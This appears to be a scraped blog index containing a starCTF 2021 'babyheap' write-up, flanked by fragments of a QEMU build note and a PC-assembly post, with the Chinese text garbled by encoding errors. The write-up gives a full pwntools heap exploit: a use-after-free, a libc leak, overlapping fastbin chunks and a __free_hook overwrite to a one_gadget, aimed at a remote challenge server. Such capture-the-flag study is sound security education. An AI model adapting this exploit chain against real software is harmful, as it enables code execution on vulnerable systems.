zlib1g-dev unzip cmake yasm libx264-dev libmp3lame-dev libopus-dev libvorbis-dev libxcb1-dev libxcb-shm0-dev libxcb-xfixes0-dev pkg-config texinfo wget zlib1g-dev \ncd build-qemu/\n../qemu/configure --enable-debug\nmake -j4\n```","categories":["ç¼–è¯‘"]},{"title":"starCTF2021 babyheap","url":"/2021/01/17/starctf-babyheap/","content":"\n# 1 åˆ†æ\n\n[babyheap](starctf-babyheap.zip)\n\né¢˜ç›®åŒ…å«ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºå’Œä¸€ä¸ªlibcã€‚\n\nç¨‹åºæä¾›äº†å…­ä¸ªåŠŸèƒ½ï¼Œåœ¨deleteä¸­freeåæœªå°†æŒ‡é’ˆç½®NULLï¼Œå¯¼è‡´UAFã€‚\n\n## tcache\n\nlibcç‰ˆæœ¬æ˜¯2.27ï¼Œfreeåçš„chunkä¼šè¢«æ‰”åˆ°tcacheä¸­ã€‚ç”±äºæœ¬é¢˜æ‰€ç”¨çš„libcåšäº†æ”¹åŠ¨ï¼Œæ— æ³•é€šè¿‡double freeå½¢æˆä¸€ä¸ªç¯çŠ¶ä»¥è¾¾åˆ°ä»»æ„åœ°å€å†™ã€‚\n\naddä¸€æ¬¡ï¼Œdeleteä¸¤æ¬¡åï¼Œå †ç©ºé—´çŠ¶æ€å¦‚ä¸‹ã€‚å¯ä»¥çœ‹åˆ°tcachebinsä¸­åªæœ‰ä¸€ä¸ªfree chunkï¼Œå¹¶ä¸”å…¶bkçš„ä½ç½®è¢«å†™å…¥äº†0x0000555555757010ã€‚å°±æ˜¯è¿™ä¸ªæ ‡å¿—å¯¼è‡´æ— æ³•freeä¸¤æ¬¡æˆä¸€ä¸ªç¯çŠ¶ï¼Œå¯é€šè¿‡editå°†è¯¥å¤„å†™æˆåˆ«çš„å€¼ï¼Œç»•è¿‡æ£€æŸ¥ã€‚ä½†æ˜¯ç”±äºeditæ— æ³•å†™åˆ°fdçš„ä½ç½®ï¼Œæ‰€ä»¥è¿˜æ˜¯æ— æ³•ç®€å•åœ°ç”¨tcache double freeçš„æ–¹æ³•åˆ©ç”¨ã€‚\n\n```shell\ngefâ¤  heap bins\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Tcachebins for arena 0x7ffff7dcfc40 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nTcachebins[idx=1, size=0x30] count=1  â†  Chunk(addr=0x555555757260, size=0x30, flags=PREV_INUSE) \nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Fastbins for arena 0x7ffff7dcfc40 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nFastbins[idx=0, size=0x20] 0x00\nFastbins[idx=1, size=0x30] 0x00\nFastbins[idx=2, size=0x40] 0x00\nFastbins[idx=3, size=0x50] 0x00\nFastbins[idx=4, size=0x60] 0x00\nFastbins[idx=5, size=0x70] 0x00\nFastbins[idx=6, size=0x80] 0x00\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Unsorted Bin for arena '*0x7ffff7dcfc40' â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n[+] Found 0 chunks in unsorted bin.\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Small Bins for arena '*0x7ffff7dcfc40' â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n[+] Found 0 chunks in 0 small non-empty bins.\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Large Bins for arena '*0x7ffff7dcfc40' â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n[+] Found 0 chunks in 0 large non-empty bins.\ngefâ¤  heap chunks\nChunk(addr=0x555555757010, size=0x250, flags=PREV_INUSE)\n    [0x0000555555757010     00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]\nChunk(addr=0x555555757260, size=0x30, flags=PREV_INUSE)\n    [0x0000555555757260     00 00 00 00 00 00 00 00 10 70 75 55 55 55 00 00    .........puUUU..]\nChunk(addr=0x555555757290, size=0x20d80, flags=PREV_INUSE)  â†  top chunk\ngefâ¤  x/10gx 0x0000555555757260\n0x555555757260:\t0x0000000000000000\t0x0000555555757010\n0x555555757270:\t0x0000000000000000\t0x0000000000000000\n0x555555757280:\t0x0000000000000000\t0x0000000000020d81\n0x555555757290:\t0x0000000000000000\t0x0000000000000000\n0x5555557572a0:\t0x0000000000000000\t0x0000000000000000\n```\n\n## fastbin\n\ntcacheä¸­æ— æ³•åˆ©ç”¨ï¼Œé‚£ä¹ˆæŠŠtcacheçš„ä¸€æ¡é“¾å¡«æ»¡ï¼Œè®©free chunkè¿›å…¥fastbinä¸­ã€‚\n\né¢˜ç›®æºç é‡Œleaveyouname()å‡½æ•°ä¸­ä¼šç”³è¯·ä¸€ä¸ª0x400çš„è¶…å¤§chunkï¼Œç”³è¯·è¶…å¤§chunkæ—¶ä¼šè§¦å‘fastbinä¸­çš„free chunkåˆå¹¶â€”â€”è·Ÿtop chunkæŒ¨ç€çš„ä¼šåˆå¹¶åˆ°top chunkä¸­ç„¶ååˆ†é…å‡ºå»ï¼Œä¸è·Ÿtop chunkæŒ¨ç€çš„ä¼šåˆå¹¶èµ·æ¥æ”¾åˆ°unsortedbinæˆ–è€…smallbinä¸­ã€‚\n\nè¿›å…¥unsortedbinæˆ–è€…smallbinä¸­çš„å †å—ä¼šæœ‰main_arenaçš„åœ°å€ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡æ³„éœ²è¿™ä¸ªåœ°å€è¿›è€Œæ³„éœ²libcã€‚\n\nadd 16ä¸ªä¸åŒçš„indexï¼ˆä»0åˆ°15ï¼‰ï¼Œç„¶åå…¨éƒ¨deleteæ‰ï¼Œå¾—åˆ°å¦‚ä¸‹binçŠ¶æ€ã€‚0~6åœ¨tcacheä¸­ï¼Œ7~15åœ¨fastbinä¸­ã€‚æ­¤æ—¶ç”³è¯·å¤§å †å—ï¼Œä¼šå°†7~15å…¨éƒ¨åˆå¹¶åˆ°top chunkï¼Œç„¶ååˆ†é…ç»™æ–°çš„ç”³è¯·ã€‚è¿™æ ·å°†ä¸ä¼šæœ‰chunkè¿›å…¥unsortedbinæˆ–è€…smallbinã€‚æ‰€ä»¥éœ€è¦åœ¨7~15ä¸­ä¿æŒä¸€ä¸ªchunkä¸é‡Šæ”¾ï¼Œå°†åŸæœ¬ç©ºé—´è¿ç»­çš„chunkåˆ†æˆä¸¤éƒ¨åˆ†ã€‚\n\næ¯”å¦‚ï¼Œå°†indexä¸º10çš„chunkä¸deleteã€‚è¿™æ ·åœ¨ç”³è¯·å¤§å †å—æ—¶ï¼Œ7~9ä¼šåˆå¹¶åˆ°smallbinä¸­ï¼Œ11~15ä¼šåˆå¹¶åˆ°top chunkä¸­ç„¶ååˆ†é…ç»™æ–°çš„ç”³è¯·ã€‚\n\n```shell\ngefâ¤  heap bins\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Tcachebins for arena 0x7fd435ee1c40 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nTcachebins[idx=0, size=0x20] count=7  â†  Chunk(addr=0x55e338453320, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x55e338453300, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x55e3384532e0, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x55e3384532c0, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x55e3384532a0, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x55e338453280, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x55e338453260, size=0x20, flags=PREV_INUSE) \nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Fastbins for arena 0x7fd435ee1c40 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nFastbins[idx=0, size=0x20]  â†  Chunk(addr=0x55e338453440, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x55e338453420, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x55e338453400, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x55e3384533e0, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x55e3384533c0, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x55e3384533a0, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x55e338453380, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x55e338453360, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x55e338453340, size=0x20, flags=PREV_INUSE) \nFastbins[idx=1, size=0x30] 0x00\nFastbins[idx=2, size=0x40] 0x00\nFastbins[idx=3, size=0x50] 0x00\nFastbins[idx=4, size=0x60] 0x00\nFastbins[idx=5, size=0x70] 0x00\nFastbins[idx=6, size=0x80] 0x00\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Unsorted Bin for arena '*0x7fd435ee1c40' â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n[+] Found 0 chunks in unsorted bin.\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Small Bins for arena '*0x7fd435ee1c40' â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n[+] Found 0 chunks in 0 small non-empty bins.\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Large Bins for arena '*0x7fd435ee1c40' â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n[+] Found 0 chunks in 0 large non-empty bins.\n```\n\nåˆ©ç”¨ä¸Šè¿°æ€è·¯ï¼Œæ³„éœ²main_arenaåœ°å€è¿›è€Œè·å¾—libcåŸºå€çš„ä»£ç å¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nmyproc = process(['./pwn'],env={\"LD_PRELOAD\":\"./libc.so.6\"})\nmylibc = ELF('./libc.so.6')\n\ndef add(index,size):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n    myproc.recvuntil(\"input size\")\n    myproc.sendline(str(size))\n\ndef delete(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n\ndef edit(index,content):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n    myproc.recvuntil(\"input content\")\n    myproc.sendline(content)\n\ndef show(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n\ndef leaveyourname(name):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(5))\n    myproc.recvuntil(\"your name:\")\n    myproc.send(name)\n\ndef showyourname():\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(6))\n\nfor i in range(16):\n    add(i,0x10)\n\nfor i in range(10):\n    delete(i)\n\n# ç¬¬10ä¸ªchunkä¸deleteï¼Œä¿è¯åˆå¹¶æ—¶æœ‰fastbinèƒ½åˆå¹¶åˆ°unsortedbinæˆ–è€…smallbinä¸­\nfor i in range(11,16,1):\n    delete(i)\n\ngdb.attach(myproc)\n\n# è§¦å‘å †åˆå¹¶\nname = 'aaaa'\nleaveyourname(name)\n\n# æ³„éœ²smallbinä¸­çš„main_arenaåœ°å€\nshow(7)\nmyproc.recvline()\nsmall_bin_c = myproc.recv(6)\n\n# é€šè¿‡è°ƒè¯•æ—¶çœ‹åˆ°çš„åœ°å€å·®ï¼Œç®—å‡ºlibcåŸºå€\nlibc_base = u64(small_bin_c.ljust(8,'\\x00')) -0x3ebcf0\n\nmyproc.interactive()\n```\n\n## UAF\n\nä¸Šè¿°11~15 fastbin chunkè·Ÿtop chunkåˆå¹¶ååˆ†é…ç»™äº†leaveyounameä¸­çš„name=malloc(0x400)ã€‚\n\næ­¤æ—¶nameæŒ‡å‘11~15ï¼Œaddå‡½æ•°ä¸­çš„pools[11]~pools[15]ä¹ŸæŒ‡å‘è¯¥å¤„ï¼ˆdeleteå‡½æ•°ä¸­free pools[]åæœªå°†å…¶ç½®NULLï¼‰ã€‚\n\næ‰€ä»¥å¯ä»¥å€ŸåŠ©nameçš„è¾“å…¥å¸ƒç½®chunkï¼Œå†é€šè¿‡pools[]æ•°ç»„æ“ä½œã€‚\n\n```python\nfor i in range(16):\n    add(i,0x10)\n\nfor i in range(10):\n    delete(i)\n\nfor i in range(11,16,1):\n    delete(i)\n\ngdb_text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(myproc.pid)).readlines()[1], 16)\nlog.warn(\"base is 0x%x\" % gdb_text_base)\nbss_addr = gdb_text_base + 0x202020\n\nname = 'a'*8 + 'b'*8 + 'c'*8 + '\\x61' + '\\x00'*7\nname += '\\x00'*24 + '\\x31' + '\\x00'*7\nleaveyourname(name)\n# gdb.attach(myproc)\n\ndelete(12)\ndelete(13)  # æ‰§è¡Œå®Œè¿™ä¸¤ä¸ªdeleteåï¼Œfastbinä¸­ä¼šå‡ºç°ä¸€ä¸ª0x60å’Œä¸€ä¸ª0x30çš„free chunkã€‚è¿™ä¸¤ä¸ªchunkå®é™…æ—¶é‡å çš„ï¼Œ0x60çš„chunkåŒ…å«0x30çš„chunkã€‚æ‰€ä»¥åé¢é€šè¿‡æ”¹0x60è¿™ä¸ªchunkçš„å†…å®¹å¯ä»¥æ”¹0x30è¿™ä¸ªchunkçš„fd\n\nadd(0,0x50)  # ä¼šå°†fastbinä¸Š0x60é‚£ä¸ªchunkåˆ†é…å‡ºæ¥\npayload1 = '\\x00'*16 + '\\x31' + '\\x00'*7 + p64(bss_addr)\nedit(0,payload1)  # å°†bss_addrå†™å…¥0x30è¿™ä¸ªchunkçš„fd\nadd(1,0x20)  # ç”³è¯·0x20å¤§å°çš„å †å—ï¼Œä¼šå°†fastbinä¸Š0x30çš„chunkåˆ†é…å‡ºæ¥ã€‚ç”±äºä¸Šä¸€æ­¥æ”¹äº†fdï¼ˆbss_addrï¼‰ï¼Œæ‰€ä»¥ä¸‹ä¸€æ¬¡å†ç”³è¯·åŒæ ·å¤§å°çš„chunkæ—¶ï¼Œä¼šä»bss_addrå¤„å¼€å§‹åˆ†é…\nadd(2,0x20)  # è¿™æ¬¡addï¼Œåˆ†é…çš„æ˜¯bss_addrå¤„ã€‚å› æ­¤ï¼Œåé¢å¯¹è¿™ä¸ªchunkçš„æ“ä½œä¼šå¤å†™bssæ®µã€‚é€šè¿‡æ›´æ”¹payload1ä¸­çš„åœ°å€ï¼Œå¯ä»¥å®ç°ä»»æ„åœ°å€å†™ä»»æ„å€¼\nedit(2,p64(0xdeadbeef))\n```\n\næ‰§è¡Œå®Œleaveyounameåçš„å †ç©ºé—´ï¼š\n\n```\ngefâ¤  heap chunks\nChunk(addr=0x55a8beee9010, size=0x250, flags=PREV_INUSE)\n    [0x000055a8beee9010     07 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]\nChunk(addr=0x55a8beee9260, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee9260     00 00 00 00 00 00 00 00 10 90 ee be a8 55 00 00    .............U..]\nChunk(addr=0x55a8beee9280, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee9280     60 92 ee be a8 55 00 00 10 90 ee be a8 55 00 00    `....U.......U..]\nChunk(addr=0x55a8beee92a0, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee92a0     80 92 ee be a8 55 00 00 10 90 ee be a8 55 00 00    .....U.......U..]\nChunk(addr=0x55a8beee92c0, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee92c0     a0 92 ee be a8 55 00 00 10 90 ee be a8 55 00 00    .....U.......U..]\nChunk(addr=0x55a8beee92e0, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee92e0     c0 92 ee be a8 55 00 00 10 90 ee be a8 55 00 00    .....U.......U..]\nChunk(addr=0x55a8beee9300, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee9300     e0 92 ee be a8 55 00 00 10 90 ee be a8 55 00 00    .....U.......U..]\nChunk(addr=0x55a8beee9320, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee9320     00 93 ee be a8 55 00 00 10 90 ee be a8 55 00 00    .....U.......U..]\nChunk(addr=0x55a8beee9340, size=0x60, flags=PREV_INUSE)\n    [0x000055a8beee9340     f0 2c 2b 5c d4 7f 00 00 f0 2c 2b 5c d4 7f 00 00    .,+\\.....,+\\....]\nChunk(addr=0x55a8beee93a0, size=0x20, flags=)\n    [0x000055a8beee93a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]\nChunk(addr=0x55a8beee93c0, size=0x410, flags=PREV_INUSE)\n    [0x000055a8beee93c0     61 61 61 61 61 61 61 61 62 62 62 62 62 62 62 62    aaaaaaaabbbbbbbb]\nChunk(addr=0x55a8beee97d0, size=0x20840, flags=PREV_INUSE)  â†  top chunk\ngefâ¤  x/20gx 0x000055a8beee93c0\n0x55a8beee93c0:\t0x6161616161616161\t0x6262626262626262\t# pools[11]çš„å†…å®¹\n0x55a8beee93d0:\t0x6363636363636363\t0x0000000000000061\t# pools[12]çš„size\n0x55a8beee93e0:\t0x0000000000000000\t0x0000000000000000  # pools[12]çš„å†…å®¹\n0x55a8beee93f0:\t0x0000000000000000\t0x0000000000000031\t# pools[13]çš„size\n0x55a8beee9400:\t0x000055a8beee930a\t0x0000000000000000\t# pools[13]çš„size\n0x55a8beee9410:\t0x0000000000000000\t0x0000000000020bf1\n0x55a8beee9420:\t0x000055a8beee93f0\t0x0000000000000000\n0x55a8beee9430:\t0x0000000000000000\t0x0000000000020bd1\n0x55a8beee9440:\t0x000055a8beee9410\t0x0000000000000000\n0x55a8beee9450:\t0x0000000000000000\t0x0000000000020bb1\n```\n\n# EXP\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nmyproc = remote(\"52.152.231.198\",8081)\n# myproc = process(['./pwn'],env={\"LD_PRELOAD\":\"./libc.so.6\"})\nmylibc = ELF('./libc.so.6')\n\ndef add(index,size):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n    myproc.recvuntil(\"input size\")\n    myproc.sendline(str(size))\n\ndef delete(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n\ndef edit(index,content):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n    myproc.recvuntil(\"input content\")\n    myproc.sendline(content)\n\ndef show(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n\ndef leaveyourname(name):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(5))\n    myproc.recvuntil(\"your name:\")\n    myproc.send(name)\n\ndef showyourname():\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(6))\n\nfor i in range(16):\n    add(i,0x10)\n\nfor i in range(10):\n    delete(i)\n\nfor i in range(11,16,1):\n    delete(i)\n\n# gdb.attach(myproc)\n\nname = 'a'*8 + 'b'*8 + 'c'*8 + '\\x61' + '\\x00'*7\nname += '\\x00'*24 + '\\x31' + '\\x00'*7\nleaveyourname(name)\n\nshow(7)\nmyproc.recvline()\nsmall_bin_c = myproc.recv(6)\n\nlibc_base = u64(small_bin_c.ljust(8,'\\x00')) -0x3ebcf0\n\n\nfree_hook = mylibc.symbols['__free_hook'] + libc_base\nlog.warn(\"free hook 0x%x\" % free_hook)\n\n# exec_addr = 0xdeadbeef\nexec_addr = libc_base + 0x4f432\ndelete(12)\ndelete(13)\n\nadd(0,0x50)\npayload1 = '\\x00'*16 + '\\x31' + '\\x00'*7 + p64(free_hook - 0x8)\nedit(0,payload1)\nadd(1,0x20)\nadd(2,0x20)\nedit(2,p64(exec_addr))\nlog.warn(\"small bin : 0x%x\" % u64(small_bin_c.ljust(8,'\\x00')))\nlog.success(\"libc base : 0x%x\" % libc_base)\nlog.warn(\"free hook 0x%x\" % free_hook)\n\ndelete(9)\n\nmyproc.interactive()\n\n```","categories":["CTF"]},{"title":"ä»é›¶å¼€å§‹ç»„è£…å°å¼æœº","url":"/2020/12/20/myfirstpc/","content":"\n> ç°åœ¨çš„ç¬”è®°æœ¬å·²ç»ç”¨äº†4å¹´äº†ï¼Œä¸ŠåŠå¹´åŠ äº†ä¸€å—8gçš„å†…å­˜æ¡ï¼Œç°åœ¨ç”¨ç€æ€§èƒ½ä¹Ÿè¿˜ä¸é”™ã€‚ä½†æ˜¯æœ€è¿‘æƒ³å¼€å§‹å­¦ä¹ æ¸—é€å’Œwebï¼Œéœ€è¦æ­å»ºå„ç§è™šæ‹Ÿæœºç¯å¢ƒï¼Œæœ‰æ—¶éœ€è¦åŒæ—¶è·‘5ã€6å°è™šæ‹Ÿæœºï¼Œç¬”è®°æœ¬ç¡®å®å—ä¸ä½ã€‚æ‰€ä»¥ï¼Œå‡ºäºæ€§ä»·æ¯”å’Œæ¢ç´¢ç²¾ç¥çš„è€ƒè™‘ï¼Œå†³å®šå°è¯•è‡ªå·±ç»„è£…ä¸€å°windowså°å¼æœºã€‚æ„Ÿè§‰æœ‰ç‚¹é…·é…·çš„O(âˆ©_âˆ©)O\n\nåœ¨å¼€å§‹ç»„è£…ç”µè„‘ä¹‹å‰ï¼Œåšäº†ä¸€ç‚¹å°åŠŸè¯¾ï¼Œå…¶å®å°±æ˜¯çœ‹çŸ¥ä¹ä¸Šåˆ«äººæ¨èçš„å„ç§ç»„ä»¶ã€‚ä¸»è¦å‚è€ƒäº†å¦‚ä¸‹ä¸¤ç¯‡æ–‡ç« ï¼š\n\n- [ä¹°å°å¼ç”µè„‘ 6000ï½7000æ˜¯ç›´æ¥ä¹°å“ç‰Œæœº è¿˜æ˜¯è‡ªå·±ç»„è£… æ€§ä»·æ¯”é«˜?](https://www.zhihu.com/question/402052824/answer/1340237376)\n- [7000å…ƒintelåä»£é…·ç¿i7 10700Fç”µè„‘é…ç½®æ–¹æ¡ˆ](https://zhuanlan.zhihu.com/p/315480353)\n\nåé¢è¿™ç¯‡æ–‡ç« çš„ä½œè€…è¿˜å†™äº†å¾ˆå¤šå¸–å­ï¼Œåˆ†åˆ«ä»‹ç»äº†ä¸åŒä»·ä½çš„ç»„è£…æœºæ­é…ã€‚ä¸ä¸€å®šè¦å®Œå…¨æŒ‰ç…§ä»–ä»¬æ¨èçš„ç»„ä»¶è¿›è¡Œé…ç½®ï¼Œä½†èƒ½æä¾›ä¸€ä¸ªç›¸å¯¹å®Œæ•´çš„æ–¹æ¡ˆç»™æˆ‘ä»¬è¿™ç§å°ç™½åšå‚è€ƒï¼ŒçœŸçš„æ˜¯éå¸¸å¥½çš„ã€‚\n\næƒ³è¦ç»„è£…ä¸€å°ä¸»æœºï¼Œé¦–å…ˆéœ€è¦çŸ¥é“ä¸»æœºç”±å“ªäº›ç»„ä»¶æ„æˆï¼Œæˆ‘çš„ç†è§£å¦‚ä¸‹ï¼š\n\n- 1ã€CPUï¼šè¿™æ˜¯ä¸€å°ä¸»æœºçš„æ ¸å¿ƒï¼Œè®¡ç®—èƒ½åŠ›éƒ½é å®ƒäº†ã€‚x86æ¶æ„çš„æœ‰intelå’Œamdä¸¤å®¶å‚å•†å¯é€‰ã€‚\n- 2ã€ä¸»æ¿ï¼šä¸»æ¿ä¸Šçš„ç”µè·¯éå¸¸ä¸°å¯Œï¼Œè´Ÿè´£è¿æ¥å„ä¸ªç»„ä»¶ï¼Œéå¸¸é‡è¦ã€‚\n- 3ã€æ•£çƒ­å™¨ï¼šé¡¾åæ€ä¹‰ç”¨æ¥æ•£çƒ­çš„ï¼Œè¿™é‡ŒæŒ‡ç»™cpuæ•£çƒ­çš„æ•£çƒ­å™¨ã€‚\n- 4ã€å†…å­˜æ¡ï¼šä¸»æœºçš„ä¸»è¦ç»„æˆä¹‹ä¸€ã€‚\n- 5ã€ç¡¬ç›˜ï¼šåˆ†ä¸ºSSDå’Œæ™®é€šæœºæ¢°ç¡¬ç›˜ï¼Œå‰è€…é€Ÿåº¦å¿«å¾ˆå¤šã€‚\n- 6ã€æ˜¾å¡ï¼šè‹¥CPUä¸å¸¦é›†æ˜¾ï¼Œåˆ™å¿…é¡»åœ¨ä¸»æ¿å¤–æ¥ä¸€ä¸ªæ˜¾å¡ï¼Œä¸ç„¶æ— æ³•æ˜¾ç¤ºã€‚CPUå¸¦é›†æ˜¾çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥è‡ªå·±è£…ä¸ªæ›´å¥½çš„æ˜¾å¡ï¼Œç©æ¸¸æˆæ—¶ä¼šæœ‰æ›´å¥½çš„è§†è§‰ä½“éªŒã€‚\n- 7ã€ç”µæºï¼šç”µæºåˆ†å¾ˆå¤šç§ï¼Œ550Wï¼Œ600Wï¼Œ650Wï¼Œ750Wç­‰ç­‰ï¼Œæ ¹æ®å®é™…éœ€è¦è¿›è¡Œé€‰æ‹©ï¼Œæˆ‘æ˜¯æŒ‰ç…§å‚è€ƒæ–‡ç« é…çš„ç”µæºã€‚\n- 8ã€æœºç®±ï¼šç”¨æ¥å›ºå®šä¸»æ¿ï¼Œå°†ç”µæºç­‰è£…åœ¨ä¸€èµ·ï¼Œæ–¹ä¾¿åç»­ä½¿ç”¨ã€‚\n- 9ã€å¤–è®¾ï¼šéœ€è¦**é¼ æ ‡**ã€**é”®ç›˜**ã€**æ˜¾ç¤ºå™¨**è¿™äº›åŸºæœ¬çš„è¾“å…¥è¾“å‡ºè®¾å¤‡ï¼Œä¸ç„¶æ²¡æ³•è·Ÿä¸»æœºäº¤äº’å“¦ã€‚\n\n# ç¬¬ä¸€æ­¥ï¼Œä¹°é…ä»¶\n\nä¸‹é¢ä»‹ç»ä¸€ä¸‹æˆ‘ç»„è£…ç”µè„‘çš„é…ç½®å§ï¼ä¸åŒ…æ‹¬æ˜¾å¡ã€æ˜¾ç¤ºå™¨ã€é”®ç›˜é¼ æ ‡è¿™äº›ï¼Œä¸€å…±èŠ±äº†6kå·¦å³ã€‚è¿™ä¸ªä»·æ ¼å’Œè¿™ä¸ªé…ç½®çš„æ€§ä»·æ¯”ï¼Œä½œä¸ºç”µè„‘ç»„è£…å…¥é—¨æˆ‘è§‰å¾—æ˜¯å¾ˆå¯ä»¥çš„ã€‚\n\n## 1ã€CPU\n\n[intel i7-10700F 8æ ¸16çº¿ç¨‹](https://item.jd.com/100013163656.html)\n\ni7çš„cpuä¸ç®—æ–°ï¼Œä½†æ˜¯ä¹Ÿå¤Ÿç”¨å§ã€‚è¿™æ¬¾æœ‰ä¸‰ç§ç±»å‹ï¼š\n\n- 10700ï¼šå¸¦é›†æ˜¾çš„cpu\n- 10700Fï¼šä¸å¸¦é›†æ˜¾çš„cpu\n- 